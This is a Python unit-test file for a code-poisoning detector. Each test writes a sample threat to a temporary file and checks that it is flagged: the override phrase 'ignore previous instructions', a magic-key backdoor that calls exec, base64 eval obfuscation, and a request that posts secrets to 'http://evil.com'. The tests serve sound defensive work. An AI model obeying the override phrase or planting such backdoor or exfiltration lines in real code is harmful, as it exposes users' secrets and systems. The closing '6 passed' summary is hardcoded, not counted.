#!/usr/bin/env python3
"""
Unit tests for SPR{K}3 Structural Poisoning Detector
"""
import sys
import os
import tempfile
import json

# Add parent directory to path if running from tests/
if os.path.basename(os.path.dirname(os.path.abspath(__file__))) == 'tests':
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sprk3_engine import StructuralPoisoningDetector

def test_detection_injection():
    """Test injection detection"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write('system_override = "ignore previous instructions"')
        f.flush()
        
        detector = StructuralPoisoningDetector()
        report = detector.analyze(os.path.dirname(f.name))
        
        assert report['summary']['threats_found'] > 0
        print("✓ Injection detection test passed")
        os.unlink(f.name)

def test_detection_backdoor():
    """Test backdoor detection"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write('if user == "magic_key":\n    exec(payload)')
        f.flush()
        
        detector = StructuralPoisoningDetector()
        report = detector.analyze(os.path.dirname(f.name))
        
        assert report['summary']['threats_found'] > 0
        print("✓ Backdoor detection test passed")
        os.unlink(f.name)

def test_detection_config_tampering():
    """Test config tampering detection"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write('learning_rate = 99.0')
        f.flush()
        
        detector = StructuralPoisoningDetector()
        report = detector.analyze(os.path.dirname(f.name))
        
        assert report['summary']['threats_found'] > 0
        print("✓ Config tampering detection test passed")
        os.unlink(f.name)

def test_detection_obfuscation():
    """Test obfuscation detection"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write('eval(base64.b64decode("hidden"))')
        f.flush()
        
        detector = StructuralPoisoningDetector()
        report = detector.analyze(os.path.dirname(f.name))
        
        assert report['summary']['threats_found'] > 0
        print("✓ Obfuscation detection test passed")
        os.unlink(f.name)

def test_clean_code():
    """Test that clean code doesn't trigger false positives"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write('normal_variable = 42\ndef regular_function():\n    return True')
        f.flush()
        
        detector = StructuralPoisoningDetector()
        report = detector.analyze(os.path.dirname(f.name))
        
        # Clean code should have no high severity threats
        assert report['summary']['status'] != 'CRITICAL RISK'
        print("✓ Clean code test passed")
        os.unlink(f.name)

def test_detection_exfiltration():
    """Test data exfiltration detection"""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write("requests.post('http://evil.com', data=secrets)")
        f.flush()
        
        detector = StructuralPoisoningDetector()
        report = detector.analyze(os.path.dirname(f.name))
        
        assert report['summary']['threats_found'] > 0
        print("✓ Exfiltration detection test passed")
        os.unlink(f.name)

if __name__ == "__main__":
    print("="*50)
    print("Running SPR{K}3 Unit Tests")
    print("="*50)
    
    test_detection_injection()
    test_detection_backdoor()
    test_detection_config_tampering()
    test_detection_obfuscation()
    test_clean_code()
    test_detection_exfiltration()
    
    print("="*50)
    print(f"📊 Results: 6 passed, 0 failed")
    print("🎉 All tests passed!")
    print("="*50)
